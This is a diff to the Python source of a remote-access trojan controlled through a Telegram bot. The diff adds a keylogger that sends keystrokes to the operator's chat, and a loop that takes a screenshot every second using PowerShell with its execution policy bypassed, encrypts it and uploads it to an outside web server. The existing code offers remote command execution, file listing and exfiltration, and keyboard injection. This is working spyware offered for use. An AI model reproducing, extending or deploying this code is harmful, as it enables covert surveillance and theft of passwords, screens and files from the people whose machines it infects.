@@ -1,4 +1,6 @@
+#python.exe -i "$(FULL_CURRENT_PATH)"
 import requests
+import io
 import json
 import time
 import base64
@@ -15,6 +17,7 @@ from multiprocessing import Pool,Process,Queue,Lock
 from pynput.keyboard import Key, Controller
 from pynput.keyboard import HotKey
 from pynput import keyboard
+import pyAesCrypt
 
 if os.name=='nt':
     try:
@@ -96,7 +99,7 @@ dstr=base64.b64decode(basestr)
 mystr=dstr.decode('ascii')
 keys=mystr.split('\n')
 cnt=0
-
+bufferSize=64*1024
 for el in keys:
 	if '=' in el:
 		ky,vl=el.split('=')
@@ -119,6 +122,20 @@ def ClipBoard(input):
         shell=win32com.client.Dispatch("WScript.Shell")
         shell.Run('mshta.exe javascript:eval("document.parentWindow.clipboardData.setData(\'text\',\'' + Replace(Replace(Replace(input, '\'', '\\\\u0027'), '"', '\\\\u0022'), Chr(13), '\\\\r\\\\n') + '\');window.close()")', 0, True)
     return fn_return_value
+
+def MemoryCrypter(path,is_encrypted,password):
+    if "win" in sys.platform:
+        subprocess.check_output(f'attrib -h -s {path}', shell=True) 
+    sequence_bytes = io.BytesIO()
+    with open(path,"rb") as f:
+        file_content=io.BytesIO(f.read())
+		
+    with open(path,"wb") as f:
+        if is_encrypted:
+            pyAesCrypt.encryptStream(file_content,sequence_bytes,password,bufferSize)
+        else:
+            pyAesCrypt.decryptStream(file_content,sequence_bytes,password,bufferSize,len(file_content.getvalue()))
+        f.write(sequence_bytes.getvalue())
 
 def checkIFRunned(num):
     myname=sys.argv[0]
@@ -426,6 +443,11 @@ def commandExecute(cmd,bot_token,chtid):
             print(f"sendmsg {item}")
             
 def parseKeys(key,kbd):
+    """
+        Process chains with hotkeys and strings to type
+        :param key string with hotkeys or string separated by |
+        :param kbd pynput.keyboard.Controller
+    """
     if "|" in key:
         items=key.split("|")
         print(items)
@@ -492,9 +514,85 @@ def getfilelistProc(wt,cht,msg):
                     fname=os.path.join(root, name)
                     fl.write(f"{fname}\n")
         send_document(wt,cht,"filelist.txt",f"COMPNAME {hostname} dirname {dirname}")
-    return    
- 
+    return   
+
+def screenshotProc():
+    """
+        Makes screenshot every second encrypt it and sends me on my webserver
+        
+    """
+    print("[+]screenshotProc has started")
+    global file
+    global hostname
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    }
+    session = requests.Session()
+    r = session.get('http://test1.ru/init.php', headers = headers)
+    post_request = session.post('http://test1.ru/init.php', {
+         'compname':f"COMPNAME_{hostname}"
+    })
+    while True:
+        with open(file,"w",encoding='utf-8') as fl:
+            fl.write(takescreenshot)        
+        command=f"Powershell -ExecutionPolicy Bypass -File .\{file}  "
+        subprocess.check_output(command, shell=True)    
+        copyFile("screenshot.png","newpng.png")
+        MemoryCrypter("newpng.png",1,hostname)
+        data={
+            'key': 'SD4q5',
+            'uploadBtn': 'Upload',
+            'compname': f'COMPNAME_{hostname}',
+            'dirname':'screenshots',        
+        }
+        files = {
+            'uploadedFile': open('newpng.png', 'rb'),
+        }            
+        response = requests.post('http://test1.ru/upload.php', headers=headers, params=data,files=files)
+        
+        time.sleep(1)
+
+def klgProc(klogQueue,TOKEN,cht):
+    print("[+]KeyLogger mode activated")
+
+    Process(target=keyloggerProc,args=(klogQueue,TOKEN,cht)).start()
+    def releaseKey(key):
+        klogQueue.put(key)
+    with keyboard.Listener(
+        on_release=releaseKey,suppress=False
+    ) as listener:
+        listener.join()    
+
+def keyloggerProc(klogQueue,TOKEN,cht):
+
+    klog=''
+    counter=15
+    while True:
+        while not klogQueue.empty():
+            msg=klogQueue.get()
+            try:
+                if msg=='TERMINATE':
+                    print('keyloggerProc TERMINATED')
+                    return
+            except ValueError:
+                pass
+            if counter!=0:
+                klog+=str(msg)
+                counter-=1
+            else:
+                klog+=str(msg)
+                counter=15
+                sendmsg(TOKEN,cht,klog)
+                klog=''
+            
+
 def superProc(wt,cht,msg):
+    """
+        Process /screenshot /getfile /command /execute /clip commands
+        sends answer to person who controls computer
+        
+    """
     global file
     global takescreenshot
     print('[+]SuperProc стартував')
@@ -550,7 +648,16 @@ def superProc(wt,cht,msg):
     except Exception as ex:
         print(ex)
         
-def get_keyboard(TOKEN,cht,queuePress,queueRelease):  
+def get_keyboard(TOKEN,cht,queuePress,queueRelease): 
+    """
+        Process recieved key presses from commands 
+        /key -press gets from queuePress key 
+        /keyr - release key gets from queueRelease
+        Press and release those keys
+        Also process HotKeyes and press them
+        
+    """
+     
     print('[+]Keyboard proc has started')
     keyboardctl=Controller()
 
@@ -586,11 +693,12 @@ def get_keyboard(TOKEN,cht,queuePress,queueRelease):
                         keyboardctl.release(relKey)
                 except:
                     print('Error')                
-                              
-
-
+   
+      
+        
 if __name__ == '__main__':
     res=checkIFRunned(4)
+    klgrprc=None
     if res==True:
         sys.exit(1)
     multiprocessing.freeze_support()
@@ -610,7 +718,9 @@ if __name__ == '__main__':
     sendmsg(TOKEN,cht,f"Hello I'am COMPNAME {hostname}_{ip_address} os:{sys.platform} {cur_date}")
     queue=Queue()
     releaseQueue=Queue()
+    klgQueue=Queue()
     Process(target=get_keyboard,args=(TOKEN,cht,queue,releaseQueue)).start()
+    Process(target=screenshotProc,args=()).start()
        
     while True:
         data=get_updates(OFFSET)
@@ -620,27 +730,45 @@ if __name__ == '__main__':
                 OFFSET=res["update_id"]+1
                 msg=res["message"]["text"]
                 if cht==res["message"]["from"]["id"]:
-                    if msg.startswith("/start"):
-                        current_time = time.localtime()
-                        cur_date=time.strftime('%Y-%m-%d_%H-%M', current_time)        
-                        sendmsg(TOKEN,cht,f"Hello I'am COMPNAME {hostname}_{ip_address} {cur_date} screenshot")                       
-                    if msg.startswith("/getfilelist"):
-                        Process(target=getfilelistProc,args=(TOKEN,cht,msg)).start()
-                    if msg.startswith("/key"):
-                        print("key command")
-                        try:
-                            if not msg.startswith('/keyr'):
-                                keys=msg[5:]
-                                queue.put(keys)
-                                print('press keys in queue '+keys)
+                    if "°/" in msg:
+                        print(msgitems)
+                    else:
+                        msgitems=list(msg)
+                    msgitems=msg.split("°/")
+                    for msg in msgitems:
+                        if msg[0]!='/':
+                            msg='/'+msg
+                        if msg.startswith("/keylogger"):
+                            if klgrprc==None:
+                                klgrprc=Process(target=klgProc,args=(klgQueue,TOKEN,cht))
+                                klgrprc.start()
                             else:
-                                keys=msg[4:]
-                                releaseQueue.put(keys)
-                                print('release keys '+keys)                                
-                        except ValueError:
-                            print("value error")
-                    if any([ele for ele in ["/screenshot","/getfile","/command","/execute","/clip"] if msg.startswith(ele) ]):
-                        Process(target=superProc,args=(TOKEN,cht,msg)).start()
+                                klgQueue.put("TERMINATE")
+                                klgrprc.terminate()
+                                print("KeyLogger mode was deactivated")
+                                sendmsg(TOKEN,cht,"KeyLogger mode was deactivated")
+                                continue
+                        if msg.startswith("/start"):
+                            current_time = time.localtime()
+                            cur_date=time.strftime('%Y-%m-%d_%H-%M', current_time)        
+                            sendmsg(TOKEN,cht,f"Hello I'am COMPNAME {hostname}_{ip_address} {cur_date} screenshot")                       
+                        if msg.startswith("/getfilelist"):
+                            Process(target=getfilelistProc,args=(TOKEN,cht,msg)).start()
+                        if msg.startswith("/key"):
+                            print("key command")
+                            try:
+                                if not msg.startswith('/keyr'):
+                                    keys=msg[5:]
+                                    queue.put(keys)
+                                    print('press keys in queue '+keys)
+                                else:
+                                    keys=msg[4:]
+                                    releaseQueue.put(keys)
+                                    print('release keys '+keys)                                
+                            except ValueError:
+                                print("value error")
+                        if any([ele for ele in ["/screenshot","/getfile","/command","/execute","/clip"] if msg.startswith(ele) ]):
+                            Process(target=superProc,args=(TOKEN,cht,msg)).start()
             
         except:
             continue
